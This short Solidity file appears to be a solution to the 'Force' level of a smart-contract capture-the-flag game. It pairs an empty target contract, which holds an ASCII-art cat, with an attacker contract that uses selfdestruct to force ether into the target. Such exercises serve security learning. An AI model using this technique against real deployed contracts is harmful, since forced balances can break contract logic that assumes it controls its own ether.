// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract attackerV4 {
  
    function attack(address payable _force) public payable{
        selfdestruct(_force);
    }

    receive() external payable {}
}